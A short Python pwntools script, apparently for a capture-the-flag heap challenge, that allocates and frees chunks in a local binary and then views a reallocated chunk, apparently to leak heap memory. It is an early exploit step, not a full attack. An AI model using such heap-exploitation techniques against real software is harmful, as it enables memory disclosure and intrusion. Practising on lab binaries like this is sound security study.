#!/usr/bin/env	python3
import pwn

class heap_ops:
	def __init__(self):
		self.r_process = pwn.process("./main")
	

	def add_chunck(self, size, data):
		assert isinstance(data, bytes)

		self.r_process.clean()
		self.r_process.sendline(b"1")

		# send size of chunck
		self.r_process.clean()
		self.r_process.sendline(str(size).encode())

		# send data from chunck
		self.r_process.clean()
		self.r_process.sendline(data)

	def delete_chunck(self, chunck_id):
		self.r_process.clean()
		self.r_process.sendline(b"2")

		self.r_process.clean()
		self.r_process.sendline(str(chunck_id).encode())

	def view_chunck(self, chunck_id):
		self.r_process.clean()
		self.r_process.sendline(b"3")

		self.r_process.clean()
		self.r_process.sendline(str(chunck_id).encode())

		return self.r_process.recvuntil(b"1. Add")[:-6]


	def exit(self, state = 1):
		# exit program
		self.r_process.sendline(b"4")
		if not state:
			self.r_process.close()
	

@pwn.context.quiet
def main():
	hops = heap_ops()

	hops.add_chunck(8, b"138")
	hops.add_chunck(8, b"138")
	hops.delete_chunck(1)
	hops.delete_chunck(0)

	hops.add_chunck(32, b"")
	print(hops.view_chunck(0))

	hops.exit(0)

if __name__ == "__main__":
	main()
